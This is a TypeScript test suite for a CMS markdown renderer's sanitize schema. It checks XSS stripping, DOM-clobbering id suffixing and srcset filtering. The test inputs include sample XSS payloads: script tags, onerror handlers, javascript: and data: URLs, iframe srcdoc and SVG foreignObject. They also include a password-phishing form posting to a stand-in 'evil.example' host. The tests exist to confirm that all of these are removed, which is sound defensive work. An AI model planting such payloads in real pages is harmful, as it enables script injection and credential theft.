import type { Element, Properties, Root } from "hast";
import rehypeSanitize from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";
import { unified } from "unified";
import { describe, expect, it } from "vitest";
import { contentSanitizeSchema, renderDocument, type ResolvedMedia } from "../index";
import { articleInput, site } from "./fixtures";

const render = (markdown: string) => renderDocument({ markdown, slug: "post", site });

/** An element with at most a text child, for trees that only exist to be sanitised. */
function el(tagName: string, properties: Properties = {}, text?: string): Element {
  return {
    type: "element",
    tagName,
    properties,
    children: text === undefined ? [] : [{ type: "text", value: text }],
  };
}

/** Sanitise a hand-built tree, so the schema is tested rather than the parser. */
async function sanitize(tree: Root): Promise<string> {
  const processor = unified().use(rehypeSanitize, contentSanitizeSchema).use(rehypeStringify);
  return String(processor.stringify(await processor.run(tree)));
}

describe("the sanitize schema", () => {
  it("removes scripts, event handlers and javascript: URLs", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        {
          type: "element",
          tagName: "div",
          properties: { className: ["cms-tldr"] },
          children: [
            {
              type: "element",
              tagName: "script",
              properties: {},
              children: [{ type: "text", value: "alert(1)" }],
            },
            {
              type: "element",
              tagName: "img",
              properties: { src: "x.png", alt: "x", onError: "alert(1)" },
              children: [],
            },
            {
              type: "element",
              tagName: "a",
              properties: { href: "javascript:alert(1)" },
              children: [{ type: "text", value: "click" }],
            },
          ],
        },
      ],
    });

    expect(html).not.toContain("script");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    // `<script>` is dropped whole; the link survives with its href removed.
    expect(html).not.toContain("alert(1)");
    expect(html).toContain(">click</a>");
    expect(html).toContain('<img src="x.png" alt="x">');
  });

  it("keeps every class name this pipeline depends on", async () => {
    const classes = [
      "cms-tldr",
      "cms-takeaways",
      "cms-faq",
      "cms-faq__question",
      "cms-howto",
      "cms-howto__steps",
      "cms-figure",
      "cms-embed",
      "cms-anchor-alias",
    ];

    const html = await sanitize({
      type: "root",
      children: classes.map((name) => ({
        type: "element" as const,
        tagName: name.includes("takeaways") ? "ul" : name.includes("faq") ? "section" : "div",
        properties: { className: [name] },
        children: [],
      })),
    });

    for (const name of classes) expect(html).toContain(`class="${name}"`);
  });

  it("leaves ids exactly as written, because they are published URLs", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        {
          type: "element",
          tagName: "h2",
          properties: { id: "how-refunds-work" },
          children: [{ type: "text", value: "How refunds work" }],
        },
      ],
    });

    expect(html).toContain('id="how-refunds-work"');
    expect(html).not.toContain("user-content-");
  });

  it("keeps the data attributes the facade and the FAQ markers need", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        {
          type: "element",
          tagName: "div",
          properties: {
            "data-provider": "youtube",
            "data-embed-id": "abc",
            "data-cms-qa": "0",
            "data-step": "1",
            "data-unexpected": "no",
          },
          children: [],
        },
      ],
    });

    expect(html).toContain('data-provider="youtube"');
    expect(html).toContain('data-embed-id="abc"');
    expect(html).toContain('data-cms-qa="0"');
    expect(html).toContain('data-step="1"');
    expect(html).not.toContain("data-unexpected");
  });

  it("strips a data: image source, which is a document rather than an image", async () => {
    const html = await sanitize({
      type: "root",
      children: [el("img", { src: "data:text/html,<script>alert(1)</script>", alt: "x" })],
    });

    expect(html).toBe('<img alt="x">');
    expect(html).not.toContain("data:");
  });

  it("drops iframes whole, srcdoc included", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        el("iframe", { srcDoc: "<script>alert(1)</script>", src: "https://example.com" }, "fallback"),
      ],
    });

    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("srcdoc");
    expect(html).not.toContain("alert(1)");
  });

  it("has no form and no text input, so nothing can be phished through a post", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        {
          type: "element",
          tagName: "form",
          properties: { action: "https://evil.example/collect", method: "post" },
          children: [
            el("input", { type: "text", name: "password", value: "" }),
            el("button", { type: "submit" }, "Send"),
          ],
        },
      ],
    });

    expect(html).not.toContain("<form");
    expect(html).not.toContain("evil.example");
    // The default schema keeps `<input>` only in the shape GFM task lists use,
    // and forces that shape: a text field cannot survive as one.
    expect(html).not.toContain('type="text"');
    expect(html).not.toContain("name=");
    // A button is always `type="button"`, so it can never submit anything.
    expect(html).not.toContain('type="submit"');
    expect(html).toContain('<button type="button">Send</button>');
  });

  it("drops SVG and foreignObject, which would smuggle arbitrary HTML back in", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        {
          type: "element",
          tagName: "svg",
          properties: { xmlns: "http://www.w3.org/2000/svg" },
          children: [
            {
              type: "element",
              tagName: "foreignObject",
              properties: {},
              children: [el("div", { onClick: "alert(1)" }, "inside")],
            },
          ],
        },
      ],
    });

    expect(html).not.toContain("svg");
    expect(html.toLowerCase()).not.toContain("foreignobject");
    expect(html).not.toContain("onclick");
    expect(html).toContain("inside");
  });

  it("permits style only on the three elements Shiki writes to", async () => {
    const html = await sanitize({
      type: "root",
      children: [
        el("div", { style: "position:fixed;top:0" }, "overlay"),
        el("pre", { style: "color:#000" }, "code"),
        el("code", { style: "color:#000" }, "x"),
        el("span", { style: "color:#000" }, "y"),
      ],
    });

    expect(html).toContain('<div>overlay</div>');
    expect(html).not.toContain("position:fixed");
    expect(html).toContain('<pre style="color:#000">');
    expect(html).toContain('<code style="color:#000">');
    expect(html).toContain('<span style="color:#000">');
  });

  it("does not allow name on any element, since it clobbers like an id does", async () => {
    const html = await sanitize({
      type: "root",
      children: [el("a", { name: "location", href: "https://example.com" }, "x")],
    });

    expect(html).not.toContain("name=");
    expect(html).toContain('href="https://example.com"');
  });
});

describe("the rendered document", () => {
  it("never emits a script or an event handler from the source", async () => {
    const result = await render(
      [
        ":::tldr",
        "Safe summary.",
        ":::",
        "",
        "<script>alert(1)</script>",
        "",
        '<img src="x" onerror="alert(1)">',
        "",
        "[link](javascript:alert(1))",
      ].join("\n"),
    );

    expect(result.html).not.toContain("<script");
    expect(result.html).not.toContain("onerror");
    expect(result.html).not.toContain("javascript:");
    expect(result.html).toContain('<div class="cms-tldr">');
  });

  it("keeps Shiki's inline styles so highlighted code stays highlighted", async () => {
    const result = await render("```ts\nconst x = 1;\n```");

    expect(result.html).toContain("<pre");
    expect(result.html).toContain("style=");
    expect(result.html).toContain("--shiki-dark");
  });

  it("renders a code fence in an unknown language rather than failing", async () => {
    const result = await render("```notalanguage\nfoo bar\n```");

    expect(result.html).toContain("foo bar");
  });

  it("preserves the directive classes end to end", async () => {
    const { html } = await renderDocument(articleInput());

    expect(html).toContain('<div class="cms-tldr">');
    expect(html).toContain('<ul class="cms-takeaways">');
    expect(html).toContain('<section class="cms-faq">');
    expect(html).toContain('<section class="cms-howto">');
    expect(html).toContain('<figure class="cms-figure">');
    expect(html).toContain('<div class="cms-embed"');
  });

  it("never emits an unresolved embed URL as a link unless it is on the web", async () => {
    const result = await render('::embed{url="javascript:alert(1)"}');

    expect(result.html).not.toContain("href=");
    expect(result.html).not.toContain("<a");
    expect(result.html).toContain('class="cms-embed cms-embed--plain"');
    expect(result.lints.some((finding) => finding.rule === "embed-unsupported")).toBe(true);

    // A web URL nobody provides for still degrades to a plain link.
    const plain = await render('::embed{url="https://example.com/watch/1"}');
    expect(plain.html).toContain('href="https://example.com/watch/1"');
  });
});

describe("DOM clobbering", () => {
  it("suffixes a heading whose slug is a window property, and keeps everything agreeing", async () => {
    const result = await render("## Location\n\nText.");

    expect(result.html).not.toContain('id="location"');
    expect(result.html).toContain('<h2 id="location-1">');
    // The copy-link and the heading table both name the id that is in the HTML.
    expect(result.html).toContain('href="#location-1"');
    expect(result.headings.map((heading) => heading.id)).toEqual(["location-1"]);
    expect(result.headings[0]?.aliases).toEqual([]);
  });

  it("treats the reserved list case-insensitively and covers document collections", async () => {
    const result = await render("## nav\n\nText.\n\n## Forms\n\nMore.");

    expect(result.html).not.toContain('id="nav"');
    expect(result.html).not.toContain('id="forms"');
    expect(result.headings.map((heading) => heading.id)).toEqual(["nav-1", "forms-1"]);
  });

  it("keeps incrementing when the suffixed id is itself taken", async () => {
    const result = await render("## Location 1\n\nA.\n\n## Location\n\nB.");

    expect(result.headings.map((heading) => heading.id)).toEqual(["location-1", "location-2"]);
    expect(result.html).toContain('<h2 id="location-2">');
  });

  it("is deterministic: the same document yields the same suffixed id every render", async () => {
    const first = await render("## Location\n\nText.");
    const second = await render("## Location\n\nText.");
    expect(second.html).toBe(first.html);
    expect(second.headings).toEqual(first.headings);
  });

  it("never revives a clobbering id that an earlier publish emitted, not even as an alias", async () => {
    const result = await renderDocument({
      markdown: "## Location\n\nText.",
      slug: "post",
      site,
      existingHeadings: [{ depth: 2, text: "Location", id: "location", aliases: ["top"] }],
    });

    expect(result.html).not.toContain('id="location"');
    expect(result.html).not.toContain('id="top"');
    expect(result.headings).toEqual([
      { depth: 2, text: "Location", id: "location-1", aliases: [] },
    ]);
  });

  it("keeps a retitled heading's earlier id when that id is harmless", async () => {
    const result = await renderDocument({
      markdown: "## Location of the office\n\nText.",
      slug: "post",
      site,
      existingHeadings: [{ depth: 2, text: "Office location", id: "office-location", aliases: [] }],
    });

    expect(result.headings[0]?.id).toBe("office-location");
    expect(result.headings[0]?.aliases).toEqual(["location-of-the-office"]);
    expect(result.html).toContain('<span id="location-of-the-office" class="cms-anchor-alias"');
  });

  it("keeps non-ASCII anchors, because a non-English post is still cited", async () => {
    const result = await render("## Über uns\n\nText.\n\n## 日本語の見出し\n\nText.");

    expect(result.html).toContain('<h2 id="über-uns">');
    expect(result.html).toContain('<h2 id="日本語の見出し">');
  });

  it("drops srcset candidates that are not http(s) or root-relative", async () => {
    const asset: ResolvedMedia = {
      id: "asset-x",
      alt: "x",
      width: 1600,
      height: 900,
      src: "https://cdn.spendtab.com/asset-x/1600.webp",
      variants: [
        { url: "javascript:alert(1)", width: 320, format: "webp" },
        { url: "//evil.example/640.webp", width: 640, format: "webp" },
        { url: "/media/asset-x/960.webp", width: 960, format: "webp" },
        { url: "https://cdn.spendtab.com/asset-x/1600.webp", width: 1600, format: "webp" },
      ],
    };
    const result = await renderDocument({
      markdown: "![x](media://asset-x)",
      slug: "post",
      site,
      resolveMedia: () => asset,
    });

    expect(result.html).not.toContain("javascript:");
    expect(result.html).not.toContain("evil.example");
    expect(result.html).toContain(
      'srcset="/media/asset-x/960.webp 960w, https://cdn.spendtab.com/asset-x/1600.webp 1600w"',
    );
  });

  it("removes srcset altogether when no candidate survives", async () => {
    const asset: ResolvedMedia = {
      id: "asset-y",
      alt: "y",
      width: 640,
      height: 480,
      src: "https://cdn.spendtab.com/asset-y/640.webp",
      variants: [{ url: "javascript:alert(1)", width: 640, format: "webp" }],
    };
    const result = await renderDocument({
      markdown: "![y](media://asset-y)",
      slug: "post",
      site,
      resolveMedia: () => asset,
    });

    expect(result.html).not.toContain("srcset");
    expect(result.html).not.toContain("javascript:");
    expect(result.html).toContain('src="https://cdn.spendtab.com/asset-y/640.webp"');
  });
});
